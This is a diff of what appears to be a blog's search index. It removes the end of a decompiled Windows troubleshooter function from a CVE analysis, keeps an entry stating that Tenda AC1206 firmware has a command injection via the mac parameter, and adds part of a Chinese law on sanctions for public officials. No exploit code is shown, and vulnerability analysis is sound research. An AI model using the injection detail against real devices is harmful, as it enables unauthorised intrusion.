-  dwLastError4 <span class="token operator">=</span> <span class="token function">SdpGetFullPath</span><span class="token punctuation">(</span>aParentDir<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sParentDir1<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Get Full path for parent directory</span>
-  sParentDir2 <span class="token operator">=</span> sParentDir1<span class="token punctuation">;</span>
-  dwLastError1 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    dwLastError5 <span class="token operator">=</span> <span class="token function">SdpGetFullPath</span><span class="token punctuation">(</span>lChildDir<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sChildDir1<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Get Full path for child directory</span>
-    dwLastError1 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError5 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> sParentDir2 <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        iCharCounter1 <span class="token operator">=</span> <span class="token number">260</span>i64<span class="token punctuation">;</span>
-        sParentDir3 <span class="token operator">=</span> sParentDir2<span class="token punctuation">;</span>
-        <span class="token keyword">do</span>                                      <span class="token comment">// Calculate length for parent directory</span>
-        <span class="token punctuation">{</span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>sParentDir3 <span class="token punctuation">)</span>
-            <span class="token keyword">break</span><span class="token punctuation">;</span>
-          <span class="token operator">++</span>sParentDir3<span class="token punctuation">;</span>
-          <span class="token operator">--</span>iCharCounter1<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">while</span> <span class="token punctuation">(</span> iCharCounter1 <span class="token punctuation">)</span><span class="token punctuation">;</span>
-        dwLastError1 <span class="token operator">=</span> iCharCounter1 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0x80070057</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> iCharCounter1 <span class="token punctuation">)</span>
-          iLenParentDir <span class="token operator">=</span> <span class="token number">260</span> <span class="token operator">-</span> iCharCounter1<span class="token punctuation">;</span>
-      <span class="token punctuation">}</span>
-      <span class="token keyword">else</span>
-      <span class="token punctuation">{</span>
-        dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
-      <span class="token punctuation">}</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-        iLenParentDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-      <span class="token punctuation">{</span>
-        sChildDir3 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> sChildDir1 <span class="token punctuation">)</span>
-        <span class="token punctuation">{</span>
-          iCharCounter2 <span class="token operator">=</span> <span class="token number">260</span>i64<span class="token punctuation">;</span>
-          sChildDir2 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>
-          <span class="token keyword">do</span>                                    <span class="token comment">// Calculate length for child directory</span>
-          <span class="token punctuation">{</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>sChildDir2 <span class="token punctuation">)</span>
-              <span class="token keyword">break</span><span class="token punctuation">;</span>
-            <span class="token operator">++</span>sChildDir2<span class="token punctuation">;</span>
-            <span class="token operator">--</span>iCharCounter2<span class="token punctuation">;</span>
-          <span class="token punctuation">}</span>
-          <span class="token keyword">while</span> <span class="token punctuation">(</span> iCharCounter2 <span class="token punctuation">)</span><span class="token punctuation">;</span>
-          dwLastError1 <span class="token operator">=</span> iCharCounter2 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0x80070057</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> iCharCounter2 <span class="token punctuation">)</span>
-            iLenChildDir <span class="token operator">=</span> <span class="token number">260</span> <span class="token operator">-</span> iCharCounter2<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">else</span>
-        <span class="token punctuation">{</span>
-          dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-          iLenChildDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-        <span class="token punctuation">{</span>                                       <span class="token comment">// 1) Len for child dir &gt; Len for parent dir</span>
-                                                <span class="token comment">// 2) _wcsnicmp: Child dir begins with parent dir. Parent dir: %tmp%\SDIAG_random-clsid</span>
-                                                <span class="token comment">// 3) Last char of parent dir is "\" or next char for child dir, </span>
-                                                <span class="token comment">// further than parent dir length, is "\" and exist further chars after this.</span>
-          <span class="token operator">*</span>lData <span class="token operator">=</span> iLenChildDir <span class="token operator">&gt;</span> iLenParentDir
-                <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">_wcsnicmp</span><span class="token punctuation">(</span>sParentDir2<span class="token punctuation">,</span> sChildDir1<span class="token punctuation">,</span> iLenParentDir<span class="token punctuation">)</span>
-                <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>sParentDir2<span class="token punctuation">[</span>iLenParentDir <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\\'</span>
-                 <span class="token operator">||</span> sChildDir3<span class="token punctuation">[</span>iLenParentDir<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\\'</span> <span class="token operator">&amp;&amp;</span> sChildDir3<span class="token punctuation">[</span>iLenParentDir <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-          <span class="token keyword">goto</span> CLEANUP<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        dwLastError3 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>
-        itraceCode3 <span class="token operator">=</span> <span class="token number">1971</span>i64<span class="token punctuation">;</span>
-        <span class="token keyword">goto</span> DEBUG_TRACE2<span class="token punctuation">;</span>
-      <span class="token punctuation">}</span>
-      dwLastError2 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>
-      itraceCode2 <span class="token operator">=</span> <span class="token number">1968</span>i64<span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">else</span>
-    <span class="token punctuation">{</span>
-      dwLastError2 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>
-      itraceCode2 <span class="token operator">=</span> <span class="token number">1965</span>i64<span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode2<span class="token punctuation">,</span> dwLastError2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    sChildDir3 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> CLEANUP<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  dwLastError3 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
-  itraceCode3 <span class="token operator">=</span> <span class="token number">1962</span>i64<span class="token punctuation">;</span>
-DEBUG_TRACE2<span class="token operator">:</span>
-  <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode3<span class="token punctuation">,</span> dwLastError3<span class="token punctuation">)</span><span class="token punctuation">;</span>
-CLEANUP<span class="token operator">:</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> sParentDir2 <span class="token punctuation">)</span>
-    operator <span class="token function">delete</span><span class="token punctuation">(</span>sParentDir2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> sChildDir3 <span class="token punctuation">)</span>
-    operator <span class="token function">delete</span><span class="token punctuation">(</span>sChildDir3<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> dwLastError1<span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>检查参数是否有错误。 获取父目录的完整路径。 获取子目录的完整路径。 计算父目录的字符串长度。 计算子目录的字符串长度。 检查子目录是否真的是父目录的子目录。</p>
-<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul>
-<li><a href="https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd">https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd</a></li>
-<li><a href="https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example">https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>CVE</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CVE-2022-37810 Tenda路由器命令注入分析</title>
     <url>/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Tenda AC1206(v15.03.06.23)存在formWriteFacMac命令注入漏洞，可以通过mac参数执行任意命令。</p>
@@ -2819,6 +2819,227 @@ sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span
       </categories>
       <tags>
         <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中华人民共和国公职人员政务处分法（2020年6月20日）</title>
+    <url>/2025/08/10/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%85%AC%E8%81%8C%E4%BA%BA%E5%91%98%E6%94%BF%E5%8A%A1%E5%A4%84%E5%88%86%E6%B3%95%EF%BC%882020%E5%B9%B46%E6%9C%8820%E6%97%A5%EF%BC%89/</url>
+    <content><![CDATA[<p>（2020年6月20日第十三届全国人民代表大会常务委员会第十九次会议通过）</p>
+<p><strong>目录</strong></p>
+<p>　　第一章　总则</p>
+<p>　　第二章　政务处分的种类和适用</p>
+<p>　　第三章　违法行为及其适用的政务处分</p>
+<p>　　第四章　政务处分的程序</p>
+<p>　　第五章　复审、复核</p>
+<p>　　第六章　法律责任</p>
+<p>　　第七章　附则</p>
+<h2 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章　总则"></a>第一章　总则</h2><p>　　<strong>第一条</strong>　为了规范政务处分，加强对所有行使公权力的公职人员的监督，促进公职人员依法履职、秉公用权、廉洁从政从业、坚持道德操守，根据《中华人民共和国监察法》，制定本法。</p>
+<p>　　<strong>第二条</strong>　本法适用于监察机关对违法的公职人员给予政务处分的活动。</p>
+<p>　　本法第二章、第三章适用于公职人员任免机关、单位对违法的公职人员给予处分。处分的程序、申诉等适用其他法律、行政法规、国务院部门规章和国家有关规定。</p>
+<p>　　本法所称公职人员，是指《中华人民共和国监察法》第十五条规定的人员。</p>
+<p>　　<strong>第三条</strong>　监察机关应当按照管理权限，加强对公职人员的监督，依法给予违法的公职人员政务处分。</p>
+<p>　　公职人员任免机关、单位应当按照管理权限，加强对公职人员的教育、管理、监督，依法给予违法的公职人员处分。</p>
+<p>　　监察机关发现公职人员任免机关、单位应当给予处分而未给予，或者给予的处分违法、不当的，应当及时提出监察建议。</p>
+<p>　　<strong>第四条</strong>　给予公职人员政务处分，坚持党管干部原则，集体讨论决定；坚持法律面前一律平等，以事实为根据，以法律为准绳，给予的政务处分与违法行为的性质、情节、危害程度相当；坚持惩戒与教育相结合，宽严相济。</p>
+<p>　　<strong>第五条</strong>　给予公职人员政务处分，应当事实清楚、证据确凿、定性准确、处理恰当、程序合法、手续完备。</p>
+<p>　　<strong>第六条</strong>　公职人员依法履行职责受法律保护，非因法定事由、非经法定程序，不受政务处分。</p>
+<h2 id="第二章-政务处分的种类和适用"><a href="#第二章-政务处分的种类和适用" class="headerlink" title="第二章　政务处分的种类和适用"></a>第二章　政务处分的种类和适用</h2><p>　　<strong>第七条</strong>　政务处分的种类为：</p>
+<p>　　（一）警告；</p>
+<p>　　（二）记过；</p>
+<p>　　（三）记大过；</p>
+<p>　　（四）降级；</p>
+<p>　　（五）撤职；</p>
+<p>　　（六）开除。</p>
+<p>　　<strong>第八条</strong>　政务处分的期间为：</p>
+<p>　　（一）警告，六个月；</p>
+<p>　　（二）记过，十二个月；</p>
+<p>　　（三）记大过，十八个月；</p>
+<p>　　（四）降级、撤职，二十四个月。</p>
+<p>　　政务处分决定自作出之日起生效，政务处分期自政务处分决定生效之日起计算。</p>
+<p>　　<strong>第九条</strong>　公职人员二人以上共同违法，根据各自在违法行为中所起的作用和应当承担的法律责任，分别给予政务处分。</p>
+<p>　　<strong>第十条</strong>　有关机关、单位、组织集体作出的决定违法或者实施违法行为的，对负有责任的领导人员和直接责任人员中的公职人员依法给予政务处分。</p>
+<p>　　<strong>第十一条</strong>　公职人员有下列情形之一的，可以从轻或者减轻给予政务处分：</p>
+<p>　　（一）主动交代本人应当受到政务处分的违法行为的；</p>
+<p>　　（二）配合调查，如实说明本人违法事实的；</p>
+<p>　　（三）检举他人违纪违法行为，经查证属实的；</p>
+<p>　　（四）主动采取措施，有效避免、挽回损失或者消除不良影响的；</p>
+<p>　　（五）在共同违法行为中起次要或者辅助作用的；</p>
+<p>　　（六）主动上交或者退赔违法所得的；</p>
+<p>　　（七）法律、法规规定的其他从轻或者减轻情节。</p>
+<p>　　<strong>第十二条</strong>　公职人员违法行为情节轻微，且具有本法第十一条规定的情形之一的，可以对其进行谈话提醒、批评教育、责令检查或者予以诫勉，免予或者不予政务处分。</p>
+<p>　　公职人员因不明真相被裹挟或者被胁迫参与违法活动，经批评教育后确有悔改表现的，可以减轻、免予或者不予政务处分。</p>
+<p>　　<strong>第十三条</strong>　公职人员有下列情形之一的，应当从重给予政务处分：</p>
+<p>　　（一）在政务处分期内再次故意违法，应当受到政务处分的；</p>
+<p>　　（二）阻止他人检举、提供证据的；</p>
+<p>　　（三）串供或者伪造、隐匿、毁灭证据的；</p>
+<p>　　（四）包庇同案人员的；</p>
+<p>　　（五）胁迫、唆使他人实施违法行为的；</p>
+<p>　　（六）拒不上交或者退赔违法所得的；</p>
+<p>　　（七）法律、法规规定的其他从重情节。</p>
+<p>　　<strong>第十四条</strong>　公职人员犯罪，有下列情形之一的，予以开除：</p>
+<p>　　（一）因故意犯罪被判处管制、拘役或者有期徒刑以上刑罚（含宣告缓刑）的；</p>
+<p>　　（二）因过失犯罪被判处有期徒刑，刑期超过三年的；</p>
+<p>　　（三）因犯罪被单处或者并处剥夺政治权利的。</p>
+<p>　　因过失犯罪被判处管制、拘役或者三年以下有期徒刑的，一般应当予以开除；案件情况特殊，予以撤职更为适当的，可以不予开除，但是应当报请上一级机关批准。</p>
+<p>　　公职人员因犯罪被单处罚金，或者犯罪情节轻微，人民检察院依法作出不起诉决定或者人民法院依法免予刑事处罚的，予以撤职；造成不良影响的，予以开除。</p>
+<p>　　<strong>第十五条</strong>　公职人员有两个以上违法行为的，应当分别确定政务处分。应当给予两种以上政务处分的，执行其中最重的政务处分；应当给予撤职以下多个相同政务处分的，可以在一个政务处分期以上、多个政务处分期之和以下确定政务处分期，但是最长不得超过四十八个月。</p>
+<p>　　<strong>第十六条</strong>　对公职人员的同一违法行为，监察机关和公职人员任免机关、单位不得重复给予政务处分和处分。</p>
+<p>　　<strong>第十七条</strong>　公职人员有违法行为，有关机关依照规定给予组织处理的，监察机关可以同时给予政务处分。</p>
+<p>　　<strong>第十八条</strong>　担任领导职务的公职人员有违法行为，被罢免、撤销、免去或者辞去领导职务的，监察机关可以同时给予政务处分。</p>
+<p>　　<strong>第十九条</strong>　公务员以及参照《中华人民共和国公务员法》管理的人员在政务处分期内，不得晋升职务、职级、衔级和级别；其中，被记过、记大过、降级、撤职的，不得晋升工资档次。被撤职的，按照规定降低职务、职级、衔级和级别，同时降低工资和待遇。</p>
+<p>　　<strong>第二十条</strong>　法律、法规授权或者受国家机关依法委托管理公共事务的组织中从事公务的人员，以及公办的教育、科研、文化、医疗卫生、体育等单位中从事管理的人员，在政务处分期内，不得晋升职务、岗位和职员等级、职称；其中，被记过、记大过、降级、撤职的，不得晋升薪酬待遇等级。被撤职的，降低职务、岗位或者职员等级，同时降低薪酬待遇。</p>
+<p>　　<strong>第二十一条</strong>　国有企业管理人员在政务处分期内，不得晋升职务、岗位等级和职称；其中，被记过、记大过、降级、撤职的，不得晋升薪酬待遇等级。被撤职的，降低职务或者岗位等级，同时降低薪酬待遇。</p>
+<p>　　<strong>第二十二条</strong>　基层群众性自治组织中从事管理的人员有违法行为的，监察机关可以予以警告、记过、记大过。</p>
+<p>　　基层群众性自治组织中从事管理的人员受到政务处分的，应当由县级或者乡镇人民政府根据具体情况减发或者扣发补贴、奖金。</p>
+<p>　　<strong>第二十三条</strong>　《中华人民共和国监察法》第十五条第六项规定的人员有违法行为的，监察机关可以予以警告、记过、记大过。情节严重的，由所在单位直接给予或者监察机关建议有关机关、单位给予降低薪酬待遇、调离岗位、解除人事关系或者劳动关系等处理。</p>
+<p>　　《中华人民共和国监察法》第十五条第二项规定的人员，未担任公务员、参照《中华人民共和国公务员法》管理的人员、事业单位工作人员或者国有企业人员职务的，对其违法行为依照前款规定处理。</p>
+<p>　　<strong>第二十四条</strong>　公职人员被开除，或者依照本法第二十三条规定，受到解除人事关系或者劳动关系处理的，不得录用为公务员以及参照《中华人民共和国公务员法》管理的人员。</p>
+<p>　　<strong>第二十五条</strong>　公职人员违法取得的财物和用于违法行为的本人财物，除依法应当由其他机关没收、追缴或者责令退赔的，由监察机关没收、追缴或者责令退赔；应当退还原所有人或者原持有人的，依法予以退还；属于国家财产或者不应当退还以及无法退还的，上缴国库。</p>
+<p>　　公职人员因违法行为获得的职务、职级、衔级、级别、岗位和职员等级、职称、待遇、资格、学历、学位、荣誉、奖励等其他利益，监察机关应当建议有关机关、单位、组织按规定予以纠正。</p>
+<p>　　<strong>第二十六条</strong>　公职人员被开除的，自政务处分决定生效之日起，应当解除其与所在机关、单位的人事关系或者劳动关系。</p>
+<p>　　公职人员受到开除以外的政务处分，在政务处分期内有悔改表现，并且没有再发生应当给予政务处分的违法行为的，政务处分期满后自动解除，晋升职务、职级、衔级、级别、岗位和职员等级、职称、薪酬待遇不再受原政务处分影响。但是，解除降级、撤职的，不恢复原职务、职级、衔级、级别、岗位和职员等级、职称、薪酬待遇。</p>
+<p>　　<strong>第二十七条</strong>　已经退休的公职人员退休前或者退休后有违法行为的，不再给予政务处分，但是可以对其立案调查；依法应当予以降级、撤职、开除的，应当按照规定相应调整其享受的待遇，对其违法取得的财物和用于违法行为的本人财物依照本法第二十五条的规定处理。</p>
+<p>　　已经离职或者死亡的公职人员在履职期间有违法行为的，依照前款规定处理。</p>
+<h2 id="第三章-违法行为及其适用的政务处分"><a href="#第三章-违法行为及其适用的政务处分" class="headerlink" title="第三章　违法行为及其适用的政务处分"></a>第三章　违法行为及其适用的政务处分</h2><p>　　<strong>第二十八条</strong>　有下列行为之一的，予以记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p>
+<p>　　（一）散布有损宪法权威、中国共产党领导和国家声誉的言论的；</p>
+<p>　　（二）参加旨在反对宪法、中国共产党领导和国家的集会、游行、示威等活动的；</p>
+<p>　　（三）拒不执行或者变相不执行中国共产党和国家的路线方针政策、重大决策部署的；</p>
+<p>　　（四）参加非法组织、非法活动的；</p>
+<p>　　（五）挑拨、破坏民族关系，或者参加民族分裂活动的；</p>
+<p>　　（六）利用宗教活动破坏民族团结和社会稳定的；</p>
+<p>　　（七）在对外交往中损害国家荣誉和利益的。</p>
+<p>　　有前款第二项、第四项、第五项和第六项行为之一的，对策划者、组织者和骨干分子，予以开除。</p>
+<p>　　公开发表反对宪法确立的国家指导思想，反对中国共产党领导，反对社会主义制度，反对改革开放的文章、演说、宣言、声明等的，予以开除。</p>
+<p>　　<strong>第二十九条</strong>　不按照规定请示、报告重大事项，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职。</p>
+<p>　　违反个人有关事项报告规定，隐瞒不报，情节较重的，予以警告、记过或者记大过。</p>
+<p>　　篡改、伪造本人档案资料的，予以记过或者记大过；情节严重的，予以降级或者撤职。</p>
+<p>　　<strong>第三十条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职：</p>
+<p>　　（一）违反民主集中制原则，个人或者少数人决定重大事项，或者拒不执行、擅自改变集体作出的重大决定的；</p>
+<p>　　（二）拒不执行或者变相不执行、拖延执行上级依法作出的决定、命令的。</p>
+<p>　　<strong>第三十一条</strong>　违反规定出境或者办理因私出境证件的，予以记过或者记大过；情节严重的，予以降级或者撤职。</p>
+<p>　　违反规定取得外国国籍或者获取境外永久居留资格、长期居留许可的，予以撤职或者开除。</p>
+<p>　　<strong>第三十二条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p>
+<p>　　（一）在选拔任用、录用、聘用、考核、晋升、评选等干部人事工作中违反有关规定的；</p>
+<p>　　（二）弄虚作假，骗取职务、职级、衔级、级别、岗位和职员等级、职称、待遇、资格、学历、学位、荣誉、奖励或者其他利益的；</p>
+<p>　　（三）对依法行使批评、申诉、控告、检举等权利的行为进行压制或者打击报复的；</p>
+<p>　　（四）诬告陷害，意图使他人受到名誉损害或者责任追究等不良影响的；</p>
+<p>　　（五）以暴力、威胁、贿赂、欺骗等手段破坏选举的。</p>
+<p>　　<strong>第三十三条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p>
+<p>　　（一）贪污贿赂的；</p>
+<p>　　（二）利用职权或者职务上的影响为本人或者他人谋取私利的；</p>
+<p>　　（三）纵容、默许特定关系人利用本人职权或者职务上的影响谋取私利的。</p>
+<p>　　拒不按照规定纠正特定关系人违规任职、兼职或者从事经营活动，且不服从职务调整的，予以撤职。</p>
+<p>　　<strong>第三十四条</strong>　收受可能影响公正行使公权力的礼品、礼金、有价证券等财物的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除。</p>
+<p>　　向公职人员及其特定关系人赠送可能影响公正行使公权力的礼品、礼金、有价证券等财物，或者接受、提供可能影响公正行使公权力的宴请、旅游、健身、娱乐等活动安排，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职。</p>
+<p>　　<strong>第三十五条</strong>　有下列行为之一，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职：</p>
+<p>　　（一）违反规定设定、发放薪酬或者津贴、补贴、奖金的；</p>
+<p>　　（二）违反规定，在公务接待、公务交通、会议活动、办公用房以及其他工作生活保障等方面超标准、超范围的；</p>
+<p>　　（三）违反规定公款消费的。</p>
+<p>　　<strong>第三十六条</strong>　违反规定从事或者参与营利性活动，或者违反规定兼任职务、领取报酬的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除。</p>
+<p>　　<strong>第三十七条</strong>　利用宗族或者黑恶势力等欺压群众，或者纵容、包庇黑恶势力活动的，予以撤职；情节严重的，予以开除。</p>
+<p>　　<strong>第三十八条</strong>　有下列行为之一，情节较重的，予以警告、记过或者记大过；情节严重的，予以降级或者撤职：</p>
+<p>　　（一）违反规定向管理服务对象收取、摊派财物的；</p>
+<p>　　（二）在管理服务活动中故意刁难、吃拿卡要的；</p>
+<p>　　（三）在管理服务活动中态度恶劣粗暴，造成不良后果或者影响的；</p>
+<p>　　（四）不按照规定公开工作信息，侵犯管理服务对象知情权，造成不良后果或者影响的；</p>
+<p>　　（五）其他侵犯管理服务对象利益的行为，造成不良后果或者影响的。</p>
+<p>　　有前款第一项、第二项和第五项行为，情节特别严重的，予以开除。</p>
+<p>　　<strong>第三十九条</strong>　有下列行为之一，造成不良后果或者影响的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p>
+<p>　　（一）滥用职权，危害国家利益、社会公共利益或者侵害公民、法人、其他组织合法权益的；</p>
+<p>　　（二）不履行或者不正确履行职责，玩忽职守，贻误工作的；</p>
+<p>　　（三）工作中有形式主义、官僚主义行为的；</p>
+<p>　　（四）工作中有弄虚作假，误导、欺骗行为的；</p>
+<p>　　（五）泄露国家秘密、工作秘密，或者泄露因履行职责掌握的商业秘密、个人隐私的。</p>
+<p>　　<strong>第四十条</strong>　有下列行为之一的，予以警告、记过或者记大过；情节较重的，予以降级或者撤职；情节严重的，予以开除：</p>
+<p>　　（一）违背社会公序良俗，在公共场所有不当行为，造成不良影响的；</p>
+<p>　　（二）参与或者支持迷信活动，造成不良影响的；</p>
+<p>　　（三）参与赌博的；</p>
+<p>　　（四）拒不承担赡养、抚养、扶养义务的；</p>
+<p>　　（五）实施家庭暴力，虐待、遗弃家庭成员的；</p>
+<p>　　（六）其他严重违反家庭美德、社会公德的行为。</p>
+<p>　　吸食、注射毒品，组织赌博，组织、支持、参与卖淫、嫖娼、色情淫乱活动的，予以撤职或者开除。</p>
+<p>　　<strong>第四十一条</strong>　公职人员有其他违法行为，影响公职人员形象，损害国家和人民利益的，可以根据情节轻重给予相应政务处分。</p>
+<h2 id="第四章-政务处分的程序"><a href="#第四章-政务处分的程序" class="headerlink" title="第四章　政务处分的程序"></a>第四章　政务处分的程序</h2><p>　　<strong>第四十二条</strong>　监察机关对涉嫌违法的公职人员进行调查，应当由二名以上工作人员进行。监察机关进行调查时，有权依法向有关单位和个人了解情况，收集、调取证据。有关单位和个人应当如实提供情况。</p>
+<p>　　严禁以威胁、引诱、欺骗及其他非法方式收集证据。以非法方式收集的证据不得作为给予政务处分的依据。</p>
+<p>　　<strong>第四十三条</strong>　作出政务处分决定前，监察机关应当将调查认定的违法事实及拟给予政务处分的依据告知被调查人，听取被调查人的陈述和申辩，并对其陈述的事实、理由和证据进行核实，记录在案。被调查人提出的事实、理由和证据成立的，应予采纳。不得因被调查人的申辩而加重政务处分。</p>
+<p>　　<strong>第四十四条</strong>　调查终结后，监察机关应当根据下列不同情况，分别作出处理：</p>
+<p>　　（一）确有应受政务处分的违法行为的，根据情节轻重，按照政务处分决定权限，履行规定的审批手续后，作出政务处分决定；</p>
+<p>　　（二）违法事实不能成立的，撤销案件；</p>
+<p>　　（三）符合免予、不予政务处分条件的，作出免予、不予政务处分决定；</p>
+<p>　　（四）被调查人涉嫌其他违法或者犯罪行为的，依法移送主管机关处理。</p>
+<p>　　<strong>第四十五条</strong>　决定给予政务处分的，应当制作政务处分决定书。</p>
+<p>　　政务处分决定书应当载明下列事项：</p>
+<p>　　（一）被处分人的姓名、工作单位和职务；</p>
+<p>　　（二）违法事实和证据；</p>
+<p>　　（三）政务处分的种类和依据；</p>
+<p>　　（四）不服政务处分决定，申请复审、复核的途径和期限；</p>
+<p>　　（五）作出政务处分决定的机关名称和日期。</p>
+<p>　　政务处分决定书应当盖有作出决定的监察机关的印章。</p>
